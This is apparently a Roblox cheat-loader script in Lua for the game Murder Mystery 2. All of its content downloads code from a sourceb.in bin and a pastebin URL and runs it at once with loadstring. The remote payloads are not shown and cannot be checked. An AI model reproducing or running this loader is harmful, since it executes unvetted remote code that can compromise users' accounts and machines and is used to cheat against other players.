task.spawn(function()
    local ok, err = pcall(function()
        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/7NdE0WlNZe/0", true))()
    end)

    if not ok then
        warn("MM2 failed:", err)
    end
end)

task.wait(2)

loadstring(game:HttpGet("https://pastebin.com/raw/qMe78S2V",true))()
